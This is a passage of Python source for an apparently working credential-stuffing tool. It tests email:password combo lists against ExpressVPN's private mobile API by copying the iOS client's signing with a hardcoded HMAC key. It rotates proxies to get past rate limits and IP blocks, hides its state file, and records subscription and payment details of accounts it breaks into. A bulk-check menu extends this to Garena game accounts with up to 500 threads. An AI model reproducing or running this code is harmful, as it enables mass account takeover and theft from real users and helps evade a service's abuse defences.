        lines.append(f"  {WARM_GRAY}Credentials{RESET}: {SOFT_WHITE}{combo}{RESET}")
        if "401" in error or "Invalid" in error or "incorrect" in error.lower():
            error = "Wrong credentials"
        else:
            error = error[:50] + ("…" if len(error) > 50 else "")
        lines.append(f"  {WARM_GRAY}Error{RESET}: {TERRACOTTA}{error}{RESET}")
        lines.append(f"{TERRACOTTA}◆{'─' * 58}◆{RESET}")
        return "\n".join(lines)

    class RateLimitManager:
        LIMIT_FILE = os.path.join(os.path.expanduser("~"), ".express_limit.json")
        MAX_ACCOUNTS = 200
        WINDOW_SECONDS = 900

        def __init__(self):
            self.lock = Lock()
            self.start_time = None
            self.count = 0

        def _hide_file(self):
            if os.name == 'nt':
                os.system(f'attrib +h "{self.LIMIT_FILE}"')

        def _read_state(self):
            if os.path.exists(self.LIMIT_FILE):
                try:
                    with open(self.LIMIT_FILE, 'r') as f:
                        data = json.load(f)
                        return data.get('start', 0), data.get('count', 0)
                except:
                    pass
            return 0, 0

        def _write_state(self, start, count):
            with open(self.LIMIT_FILE, 'w') as f:
                json.dump({'start': start, 'count': count}, f)
            self._hide_file()

        def check_and_wait(self):
            start, count = self._read_state()
            now = time.time()
            if start == 0:
                self.start_time = now
                self.count = 0
                self._write_state(now, 0)
                return

            elapsed = now - start
            if elapsed < self.WINDOW_SECONDS and count >= self.MAX_ACCOUNTS:
                remaining = self.WINDOW_SECONDS - elapsed
                minutes = int(remaining // 60)
                seconds = int(remaining % 60)
                _log('WARNING', f'Rate limit reached. Waiting {minutes}m {seconds}s...')
                time.sleep(remaining)
                self.start_time = time.time()
                self.count = 0
                self._write_state(self.start_time, 0)
            else:
                if elapsed >= self.WINDOW_SECONDS:
                    self.start_time = now
                    self.count = 0
                    self._write_state(now, 0)
                else:
                    self.start_time = start
                    self.count = count

        def record(self):
            with self.lock:
                now = time.time()
                start, count = self._read_state()
                if now - start >= self.WINDOW_SECONDS:
                    start = now
                    count = 0
                count += 1
                self._write_state(start, count)
                if count >= self.MAX_ACCOUNTS:
                    self.start_time = start
                    self.count = count

    class ExpressVPNChecker:
        def __init__(self, proxy_manager=None):
            self.hits_premium = 0
            self.hits_free = 0
            self.invalid = 0
            self.retries = 0
            self.results_folder = "ExpressVPN_Results"
            os.makedirs(self.results_folder, exist_ok=True)
            self.valid_file = os.path.join(self.results_folder, "valid.txt")
            self.invalid_file = os.path.join(self.results_folder, "invalid.txt")
            self.write_lock = Lock()
            self.proxy_manager = proxy_manager
            self._session = None

        def _get_session(self, force_new_proxy=True):
            if self._session is None:
                self._session = requests.Session()
            if force_new_proxy and self.proxy_manager and self.proxy_manager.is_loaded():
                proxy = self.proxy_manager.get_next()
                if proxy:
                    self._session.proxies.clear()
                    self._session.proxies.update(proxy)
            return self._session

        def _rotate_proxy(self):
            if self.proxy_manager and self.proxy_manager.is_loaded():
                proxy = self.proxy_manager.get_next()
                if proxy:
                    self._session.proxies.clear()
                    self._session.proxies.update(proxy)
                    return True
            return False

        def _output(self, text):
            print(text)

        def _plain(self, text):
            return _strip_ansi(text)

        def check_account(self, email, password):
            account_data = {'email': email, 'password': password}
            # Get a fresh proxy for this request
            session = self._get_session(force_new_proxy=True)

            try:
                install_id = generate_random_string(64)
                base64_iv = base64.b64encode(get_byte_array(16)).decode('ascii')
                base64_key = base64.b64encode(get_byte_array(16)).decode('ascii')
                post_data = json.dumps({"email": email, "iv": base64_iv, "key": base64_key, "password": password})
                cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
                cert_bytes = base64.b64decode(cert_base64)
                gzipped_data = gzip_data(post_data)
                try:
                    encrypted_post_data = envelope_encrypt(gzipped_data, cert_bytes)
                except Exception as e:
                    self.invalid += 1
                    err_msg = f"Encryption failed: {str(e)[:80]}"
                    self._output(format_invalid_hit(email, password, err_msg))
                    with self.write_lock:
                        with open(self.invalid_file, 'a', encoding='utf-8') as f:
                            f.write(f"{email}:{password}  |  {err_msg}\n")
                    return
                hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
                header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                header_signature = compute_signature(header_raw.encode('ascii'), hmac_key.encode('ascii'))
                body_signature = compute_signature(encrypted_post_data, hmac_key.encode('ascii'))
                url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                headers = {
                    "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
                    "Expect": "", "Content-Type": "application/octet-stream", "X-Body-Compression": "gzip",
                    "X-Signature": f"2 {header_signature} 91c776e", "X-Body-Signature": f"2 {body_signature} 91c776e",
                    "Accept-Language": "en", "Accept-Encoding": "gzip, deflate",
                }
                try:
                    resp = session.post(url, data=encrypted_post_data, headers=headers, timeout=30)
                except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
                    if self._rotate_proxy():
                        try:
                            resp = session.post(url, data=encrypted_post_data, headers=headers, timeout=30)
                        except Exception:
                            self.invalid += 1
                            err_msg = "Request failed after proxy rotation"
                            self._output(format_invalid_hit(email, password, err_msg))
                            with self.write_lock:
                                with open(self.invalid_file, 'a', encoding='utf-8') as f:
                                    f.write(f"{email}:{password}  |  {err_msg}\n")
                            return
                    else:
                        self.invalid += 1
                        err_msg = "Request failed (proxy error)"
                        self._output(format_invalid_hit(email, password, err_msg))
                        with self.write_lock:
                            with open(self.invalid_file, 'a', encoding='utf-8') as f:
                                f.write(f"{email}:{password}  |  {err_msg}\n")
                        return
                except Exception:
                    self.invalid += 1
                    err_msg = "Request failed"
                    self._output(format_invalid_hit(email, password, err_msg))
                    with self.write_lock:
                        with open(self.invalid_file, 'a', encoding='utf-8') as f:
                            f.write(f"{email}:{password}  |  {err_msg}\n")
                    return

                # Handle HTTP errors with proxy rotation
                if resp.status_code in (401, 403, 429):
                    if resp.status_code == 429:
                        self.retries += 1
                        _log('WARNING', f'Rate limit (429) – rotating proxy and retrying...')
                        if self._rotate_proxy():
                            time.sleep(2)
                            return self.check_account(email, password)
                        else:
                            self.invalid += 1
                            err_msg = "Rate limited and no proxy to rotate"
                            self._output(format_invalid_hit(email, password, err_msg))
                            with self.write_lock:
                                with open(self.invalid_file, 'a', encoding='utf-8') as f:
                                    f.write(f"{email}:{password}  |  {err_msg}\n")
                            return
                    elif resp.status_code == 403:
                        # Maybe IP blocked, rotate proxy
                        if self._rotate_proxy():
                            _log('WARNING', f'403 – rotating proxy and retrying...')
                            time.sleep(2)
                            return self.check_account(email, password)
                        else:
                            self.invalid += 1
                            err_msg = "403 Forbidden – no proxy to rotate"
                            self._output(format_invalid_hit(email, password, err_msg))
                            with self.write_lock:
                                with open(self.invalid_file, 'a', encoding='utf-8') as f:
                                    f.write(f"{email}:{password}  |  {err_msg}\n")
                            return
                    else:
                        self.invalid += 1
                        err_msg = f"HTTP {resp.status_code}"
                        self._output(format_invalid_hit(email, password, err_msg))
                        with self.write_lock:
                            with open(self.invalid_file, 'a', encoding='utf-8') as f:
                                f.write(f"{email}:{password}  |  {err_msg}\n")
                        return

                if resp.status_code != 200:
                    self.invalid += 1
                    err_msg = "HTTP " + str(resp.status_code)
                    self._output(format_invalid_hit(email, password, err_msg))
                    with self.write_lock:
                        with open(self.invalid_file, 'a', encoding='utf-8') as f:
                            f.write(f"{email}:{password}  |  {err_msg}\n")
                    return

                try:
                    aes = AesCryptographyService()
                    plain = aes.decrypt(resp.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
                    resp_json = json.loads(plain.decode('ascii'))
                except Exception:
                    self.invalid += 1
                    err_msg = "Decryption failed"
                    self._output(format_invalid_hit(email, password, err_msg))
                    with self.write_lock:
                        with open(self.invalid_file, 'a', encoding='utf-8') as f:
                            f.write(f"{email}:{password}  |  {err_msg}\n")
                    return
                for k in ("ovpn_username", "ovpn_password", "pptp_username", "pptp_password"):
                    if k in resp_json:
                        account_data[k] = resp_json[k]
                access_token = resp_json.get("access_token")
                if not access_token:
                    account_data['license_status'] = 'NO_SUBSCRIPTION'
                    self.hits_free += 1
                    self._output(format_valid_hit(account_data, False))
                    plain_entry = self._plain(format_valid_hit(account_data, False))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(plain_entry + "\n" + "="*60 + "\n\n")
                    return
                sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
                sub_sig = compute_signature(sub_raw.encode('ascii'), hmac_key.encode('ascii'))
                batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                batch_sig = compute_signature(batch_raw.encode('ascii'), hmac_key.encode('ascii'))
                capture_body = json.dumps([{
                    "headers": {"Accept-Language": "en", "X-Signature": f"2 {sub_sig} 91c776e"},
                    "method": "GET",
                    "url": f"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email",
                }])
                capture_body_sig = compute_signature(capture_body.encode('ascii'), hmac_key.encode('ascii'))
                batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
                batch_headers = {
                    "User-Agent": "xvclient/v21.21.0 (ios wiecz; 14.4) ui/11.5.2",
                    "X-Body-Compression": "gzip",
                    "X-Signature": f"2 {batch_sig} 91c776e",
                    "X-Body-Signature": f"2 {capture_body_sig} 91c776e",
                    "Accept-Language": "en",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/json",
                }
                try:
                    br = session.post(batch_url, data=capture_body, headers=batch_headers, timeout=30)
                except Exception:
                    self.hits_free += 1
                    account_data['license_status'] = 'BATCH_FAIL'
                    self._output(format_valid_hit(account_data, False))
                    plain_entry = self._plain(format_valid_hit(account_data, False))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(plain_entry + "\n" + "="*60 + "\n\n")
                    return
                if br.status_code == 429:
                    self.retries += 1
                    _log('WARNING', f'Rate limit (429) on batch – rotating proxy and retrying...')
                    if self._rotate_proxy():
                        time.sleep(2)
                        return self.check_account(email, password)
                    else:
                        self.invalid += 1
                        err_msg = "Rate limited on batch – no proxy to rotate"
                        self._output(format_invalid_hit(email, password, err_msg))
                        with self.write_lock:
                            with open(self.invalid_file, 'a', encoding='utf-8') as f:
                                f.write(f"{email}:{password}  |  {err_msg}\n")
                        return
                if br.status_code != 200:
                    self.hits_free += 1
                    account_data['license_status'] = f'BATCH_HTTP_{br.status_code}'
                    self._output(format_valid_hit(account_data, False))
                    plain_entry = self._plain(format_valid_hit(account_data, False))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(plain_entry + "\n" + "="*60 + "\n\n")
                    return
                try:
                    batch_data = br.json()
                except Exception:
                    self.hits_free += 1
                    account_data['license_status'] = 'BATCH_JSON_ERROR'
                    self._output(format_valid_hit(account_data, False))
                    plain_entry = self._plain(format_valid_hit(account_data, False))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(plain_entry + "\n" + "="*60 + "\n\n")
                    return
                if not batch_data:
                    self.hits_free += 1
                    account_data['license_status'] = 'EMPTY_BATCH'
                    self._output(format_valid_hit(account_data, False))
                    plain_entry = self._plain(format_valid_hit(account_data, False))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(plain_entry + "\n" + "="*60 + "\n\n")
                    return
                item = batch_data[0]
                item_code = item.get('code') or item.get('status')
                if item_code == 429:
                    self.retries += 1
                    _log('WARNING', f'Rate limit (429) on sub – rotating proxy...')
                    if self._rotate_proxy():
                        time.sleep(2)
                        return self.check_account(email, password)
                    else:
                        self.invalid += 1
                        err_msg = "Rate limited on sub – no proxy"
                        self._output(format_invalid_hit(email, password, err_msg))
                        with self.write_lock:
                            with open(self.invalid_file, 'a', encoding='utf-8') as f:
                                f.write(f"{email}:{password}  |  {err_msg}\n")
                        return
                sub_data = item.get('body', '{}')
                if isinstance(sub_data, str):
                    sub_data = sub_data.replace('\\"', '"')
                    try:
                        sub_json = json.loads(sub_data)
                    except Exception:
                        self.hits_free += 1
                        account_data['license_status'] = 'SUB_JSON_ERROR'
                        self._output(format_valid_hit(account_data, False))
                        plain_entry = self._plain(format_valid_hit(account_data, False))
                        with self.write_lock:
                            with open(self.valid_file, 'a', encoding='utf-8') as f:
                                f.write(plain_entry + "\n" + "="*60 + "\n\n")
                        return
                elif isinstance(sub_data, dict):
                    sub_json = sub_data
                else:
                    self.hits_free += 1
                    account_data['license_status'] = 'SUB_INVALID_TYPE'
                    self._output(format_valid_hit(account_data, False))
                    plain_entry = self._plain(format_valid_hit(account_data, False))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(plain_entry + "\n" + "="*60 + "\n\n")
                    return
                if 'subscription' in sub_json:
                    sub_json = sub_json['subscription']
                billing_cycle = sub_json.get('billing_cycle')
                if billing_cycle:
                    account_data['billing_cycle'] = billing_cycle
                    account_data['plan'] = f"{billing_cycle} Month"
                if 'expiration_time' in sub_json:
                    exp_time = sub_json['expiration_time']
                    account_data['expire_date'] = unix_time_to_date(exp_time)
                    account_data['days_left'] = int((int(exp_time) - int(datetime.now().timestamp())) / 86400)
                if 'auto_bill' in sub_json:
                    account_data['auto_renew'] = str(sub_json['auto_bill']).lower()
                if 'payment_method' in sub_json:
                    account_data['payment_method'] = sub_json['payment_method']
                license_status = str(sub_json.get('license_status', '')).upper()
                account_data['license_status'] = license_status

                if 'plan_name' in sub_json and sub_json['plan_name']:
                    account_data['plan_name'] = sub_json['plan_name']
                if 'currency' in sub_json:
                    account_data['currency'] = sub_json['currency']
                if 'country' in sub_json:
                    account_data['country'] = sub_json['country']
                if 'created_at' in sub_json:
                    account_data['subscription_created'] = sub_json['created_at']
                if 'trial_end_time' in sub_json:
                    account_data['trial_ends'] = sub_json['trial_end_time']

                try:
                    acc_info = self.fetch_account_info(access_token, install_id)
                    if acc_info:
                        if 'created_at' in acc_info:
                            account_data['account_created'] = acc_info['created_at']
                        if 'last_login_time' in acc_info:
                            account_data['last_login'] = acc_info['last_login_time']
                except:
                    pass

                if license_status == 'REVOKED':
                    self.hits_free += 1
                    self._output(format_valid_hit(account_data, False))
                    plain_entry = self._plain(format_valid_hit(account_data, False))
                    with self.write_lock:
                        with open(self.valid_file, 'a', encoding='utf-8') as f:
                            f.write(plain_entry + "\n" + "="*60 + "\n\n")
                    return
                if license_status in ('ACTIVE', 'TRIAL', 'PAID'):
                    exp_time = sub_json.get('expiration_time')
                    if exp_time and int(exp_time) > int(datetime.now().timestamp()):
                        account_data['is_premium'] = True
                        self.hits_premium += 1
                        self._output(format_valid_hit(account_data, True))
                        plain_entry = self._plain(format_valid_hit(account_data, True))
                        with self.write_lock:
                            with open(self.valid_file, 'a', encoding='utf-8') as f:
                                f.write(plain_entry + "\n" + "="*60 + "\n\n")
                        return
                    else:
                        self.hits_free += 1
                        self._output(format_valid_hit(account_data, False))
                        plain_entry = self._plain(format_valid_hit(account_data, False))
                        with self.write_lock:
                            with open(self.valid_file, 'a', encoding='utf-8') as f:
                                f.write(plain_entry + "\n" + "="*60 + "\n\n")
                        return
                self.hits_free += 1
                self._output(format_valid_hit(account_data, False))
                plain_entry = self._plain(format_valid_hit(account_data, False))
                with self.write_lock:
                    with open(self.valid_file, 'a', encoding='utf-8') as f:
                        f.write(plain_entry + "\n" + "="*60 + "\n\n")
            except Exception as e:
                self.invalid += 1
                err_msg = str(e)[:80]
                self._output(format_invalid_hit(email, password, err_msg))
                with self.write_lock:
                    with open(self.invalid_file, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}  |  {err_msg}\n")

        def fetch_account_info(self, access_token, install_id):
            hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
            raw = f"GET /apis/v2/account?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            sig = compute_signature(raw.encode('ascii'), hmac_key.encode('ascii'))
            url = f"https://www.expressapisv2.net/apis/v2/account?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            headers = {
                "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
                "X-Signature": f"2 {sig} 91c776e",
                "Accept-Language": "en",
                "Accept-Encoding": "gzip, deflate",
            }
            session = self._get_session(force_new_proxy=True)
            try:
                resp = session.get(url, headers=headers, timeout=30)
                if resp.status_code == 200:
                    return resp.json()
            except:
                pass
            return None

    rate_limit = RateLimitManager()
    rate_limit.check_and_wait()

    checker = ExpressVPNChecker(proxy_manager=proxy_manager)
    total = len(accounts)
    stats = {'checked': 0, 'total': total, 'premium': 0, 'free': 0, 'invalid': 0, 'retries': 0, 'elapsed': 0}
    stats_lock = Lock()
    start_time = datetime.now()
    last_update = 0

    def worker(combo):
        if ':' not in combo:
            with stats_lock:
                stats['checked'] += 1
                stats['invalid'] += 1
            return
        email, password = combo.split(':', 1)
        email = email.strip()
        password = password.strip()
        checker.check_account(email, password)
        with stats_lock:
            stats['checked'] += 1
            stats['premium'] = checker.hits_premium
            stats['free'] = checker.hits_free
            stats['invalid'] = checker.invalid
            stats['retries'] = checker.retries
            stats['elapsed'] = (datetime.now() - start_time).total_seconds()
        rate_limit.record()
        time.sleep(1.5)

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(worker, acc) for acc in accounts]
        for future in as_completed(futures):
            if shutdown_event.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                break
            with stats_lock:
                if stats['checked'] - last_update >= 10:
                    print(_build_express_live_stats(stats))
                    last_update = stats['checked']

    end_time = datetime.now()
    print()
    print(f"  {WARM_GRAY}══════════════════════════════════════════{RESET}")
    print(f"  {SAGE}CHECKING COMPLETE{RESET}")
    print(f"  {WARM_GRAY}══════════════════════════════════════════{RESET}")
    print()

    duration = (end_time - start_time).total_seconds()
    minutes = int(duration // 60)
    seconds = int(duration % 60)
    rate = stats['checked'] / duration if duration > 0 else 0

    print(f"  {SOFT_WHITE}Total Checked  : {SAGE}{stats['checked']}/{stats['total']}{RESET}")
    print(f"  {SOFT_WHITE}Premium HITS   : {SAGE}{stats['premium']}{RESET}")
    print(f"  {SOFT_WHITE}Free Accounts  : {DUSTY_ROSE}{stats['free']}{RESET}")
    print(f"  {SOFT_WHITE}Invalid        : {TERRACOTTA}{stats['invalid']}{RESET}")
    print(f"  {SOFT_WHITE}Retries        : {OCHRE}{stats['retries']}{RESET}")
    print(f"  {SOFT_WHITE}Time           : {WARM_GRAY}{minutes}m {seconds}s{RESET}")
    print(f"  {SOFT_WHITE}Rate           : {WARM_GRAY}{rate:.2f} acc/s{RESET}")
    print()
    print(f"  {WARM_GRAY}Results saved to: {SAND}ExpressVPN_Results/{RESET}")
    print(f"  {WARM_GRAY}  Valid   : {SAGE}valid.txt{RESET}")
    print(f"  {WARM_GRAY}  Invalid : {TERRACOTTA}invalid.txt{RESET}")
    print()
    print(f"  {CLAY}  [⬡] Powered by @lleessiee{RESET}\n")
    input(f'  {OCHRE}Press Enter to return to menu.{RESET}')

def bulk_check():
    clear_screen()
    display_banner()
    file_manager = FileManager()
    selected_file = select_input_file_flow(show_auto_remove=False)
    if not selected_file:
        _log('ERROR', 'No file selected.')
        return

    w = _w(60)
    left = "  "

    def strip_ansi(t):
        return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', t)

    def print_box_line(content):
        clean = strip_ansi(content)
        pad = (w - 4) - len(clean)
        if pad < 0:
            pad = 0
        print(f"{left}{WARM_GRAY}║{content}{' ' * pad}{WARM_GRAY}║{RESET}")

    def print_box_header(title, color=OCHRE):
        clean_title = strip_ansi(title)
        print(f"{left}{WARM_GRAY}╔{'═' * (w - 4)}╗{RESET}")
        title_pad = (w - 4) - len(clean_title)
        if title_pad < 0:
            title_pad = 0
        print(f"{left}{WARM_GRAY}║{color}{title}{RESET}{' ' * title_pad}{WARM_GRAY}║{RESET}")
        print(f"{left}{WARM_GRAY}╠{'═' * (w - 4)}╣{RESET}")

    def print_box_footer():
        print(f"{left}{WARM_GRAY}╚{'═' * (w - 4)}╝{RESET}")

    print_box_header(" REMOVE DUPLICATES ")
    print_box_line(f"{OCHRE}Remove duplicate lines from the selected file?{RESET}")
    print_box_line(f"{WARM_GRAY}Enter Y or N{RESET}")
    print_box_footer()
    print()

    dup_choice = input(f"  {WARM_GRAY}➤{OCHRE} REMOVE DUPLICATE LINES? [Y/N] : {SOFT_WHITE}").strip()
    print(RESET, end="")
    if dup_choice.lower() == 'y':
        prompt_for_duplicate_removal(selected_file)

    print_box_header(" AUTO-REMOVE CHECKED LINES ")
    print_box_line(f"{OCHRE}Automatically remove checked lines from file?{RESET}")
    print_box_line(f"{WARM_GRAY}Enter Y or N{RESET}")
    print_box_footer()
    print()

    auto_choice = input(f"  {WARM_GRAY}➤{OCHRE} AUTO-REMOVE CHECKED LINES? [Y/N] : {SOFT_WHITE}").strip()
    print(RESET, end="")
    auto_remove = (auto_choice.lower() == 'y')

    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                account, password = clean_account_line(line)
                if account and password:
                    accounts.append(f'{account}:{password}')
        _log('SUCCESS', f'File loaded: [bold]{len(accounts):,}[/bold] accounts')
    except Exception as e:
        _log('ERROR', 'Could not read file.')
        return
    if not accounts:
        _log('ERROR', 'No valid accounts found in file.')
        return
    _log('INFO', f'Total accounts queued: [bold]{len(accounts):,}[/bold]')
    print()

    print_box_header(" PROXY CONFIGURATION ")
    print_box_line(f"{TERRACOTTA}VPN ONLY HAS BEEN REMOVED{RESET}")
    print_box_line(f"{DUSTY_ROSE}PROXY & VPN IS NOW MANDATORY{RESET}")
    print_box_line(f"{WARM_GRAY}Proxy and VPN support for stable connections.{RESET}")
    print_box_footer()
    print()

    if not os.path.exists("proxies.txt"):
        _log('ERROR', 'Proxies file not found! Proxy is required to continue.')
        input(f'\n  {OCHRE}Press Enter to return to menu.{RESET}')
        return

    proxy_manager = ProxyManager()
    if not proxy_manager.is_loaded():
        _log('ERROR', 'No valid proxies found in proxies.txt.')
        input(f'\n  {OCHRE}Press Enter to return to menu.{RESET}')
        return

    _log('SUCCESS', f'Loaded [bold]{len(proxy_manager.proxies)}[/bold] proxies')
    max_threads = min(500, len(proxy_manager.proxies) * 2)
    if max_threads < 1:
        max_threads = 1

    def show_main_thread_options():
        print_box_header(" THREAD CONFIGURATION ")
        print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ 1{SOFT_WHITE} - 25 threads{RESET}  {WARM_GRAY}(Safe, stable){RESET}")
        print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ 2{SOFT_WHITE} - 50 threads{RESET}  {WARM_GRAY}(Moderate){RESET}")
        print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ 3{SOFT_WHITE} - 75 threads{RESET}  {WARM_GRAY}(Fast){RESET}")
        print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ 4{SOFT_WHITE} - 100 threads{RESET} {WARM_GRAY}(Aggressive){RESET}")
        print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ 5{SOFT_WHITE} - More threads{RESET} {WARM_GRAY}(Advanced){RESET}")
        print_box_footer()
        print()

    def show_advanced_thread_options():
        print_box_header(" CONCISE THREAD CONFIGURATION ")
        print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ 1{SOFT_WHITE} - 200 threads{RESET}  {WARM_GRAY}(High){RESET}")
        print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ 2{SOFT_WHITE} - 300 threads{RESET}  {WARM_GRAY}(Very High){RESET}")
        print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ 3{SOFT_WHITE} - 400 threads{RESET}  {WARM_GRAY}(Extreme){RESET}")
        print_box_line(f"{SAGE}ᴏᴘᴛɪᴏɴ 4{SOFT_WHITE} - 500 threads{RESET}  {WARM_GRAY}(Maximum){RESET}")
        print_box_footer()
        print()

    def show_warning_box():
        risk_w = _w(60)
        def print_risk_line(content):
            clean = strip_ansi(content)
            pad = (risk_w - 4) - len(clean)
            if pad < 0:
                pad = 0
            print(f"  {TERRACOTTA}║{content}{' ' * pad}{TERRACOTTA}║{RESET}")

        print(f"  {TERRACOTTA}╔{'═' * (risk_w - 4)}╗{RESET}")
        print_risk_line(f"{TERRACOTTA}⚠  HIGH THREAD WARNING  ⚠{RESET}")
        print_risk_line(f"{WARM_GRAY}Higher threads drastically increase:{RESET}")
        print_risk_line(f"{WARM_GRAY}• IP bans and rate limiting{TERRACOTTA} — more requests per second{SOFT_WHITE}{RESET}")
        print_risk_line(f"{WARM_GRAY}• False invalid results{TERRACOTTA} — timeouts & connection errors{RESET}")
        print_risk_line(f"{WARM_GRAY}• Proxy exhaustion{TERRACOTTA} — proxies get blocked faster{RESET}")
        print_risk_line(f"{WARM_GRAY}• System crashes{TERRACOTTA} — memory & CPU overload{RESET}")
        print_risk_line(f"{OCHRE}Recommended: Use 100 or fewer for stable results{RESET}")
        print(f"  {TERRACOTTA}╚{'═' * (risk_w - 4)}╝{RESET}")
        print()

    num_threads = None
    while num_threads is None:
        show_main_thread_options()
        mode_choice = input(f"  {DUSTY_ROSE}➤ Select option [1-5]{RESET}  {DUSTY_ROSE}➤{RESET} ").strip()
        if mode_choice not in ('1', '2', '3', '4', '5'):
            _log('ERROR', 'Invalid option. Enter 1, 2, 3, 4, or 5.')
            continue

        if mode_choice == '1':
            num_threads = 25
        elif mode_choice == '2':
            num_threads = 50
        elif mode_choice == '3':
            num_threads = 75
        elif mode_choice == '4':
            num_threads = 100
        else:
            show_warning_box()
            confirm = input(f"  {YELLOW}⚠  Continue with advanced threads? (y/n){RESET}  {YELLOW}➤{RESET} ").strip().lower()
            if confirm != 'y':
                _log('INFO', 'Returning to thread selection.')
                continue
            show_advanced_thread_options()
            adv_choice = input(f"  {DUSTY_ROSE}➤ Select option [1-4]{RESET}  {DUSTY_ROSE}➤{RESET} ").strip()
            if adv_choice not in ('1', '2', '3', '4'):
                _log('ERROR', 'Invalid option. Enter 1, 2, 3, or 4.')
                continue
            if adv_choice == '1':
                num_threads = 200
            elif adv_choice == '2':
                num_threads = 300
            elif adv_choice == '3':
                num_threads = 400
            else:
                num_threads = 500

            num_threads = min(num_threads, max_threads)
            if num_threads > max_threads:
                _log('WARNING', f'Capping to {max_threads} threads due to proxy count.')
                num_threads = max_threads

    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
    print()

    global CHECK_OTHER_GAMES
    print_box_header(" GAME CONNECTIONS ", CLAY)
    print_box_line(f"{WARM_GRAY}Check OTHER GAMES (AOV / ROV / FF / Delta Force…){RESET}")
    print_box_line(f"{WARM_GRAY}Saves each game to separate file  ·  Adds ~1-3s each{RESET}")
    print_box_footer()
    print()

    og_raw = input(f'  {CLAY}◇  Check other games? (y/N){RESET}  {DUSTY_ROSE}➤{RESET} ').strip().lower()
    CHECK_OTHER_GAMES = og_raw == 'y'
    if CHECK_OTHER_GAMES:
        _log('SUCCESS', 'Will scan all Garena game connections')
    else:
        _log('INFO', 'CODM only — skipping other game checks')
    print()

    results_manager = Results(selected_file)
    cookie_manager = CookieManager()
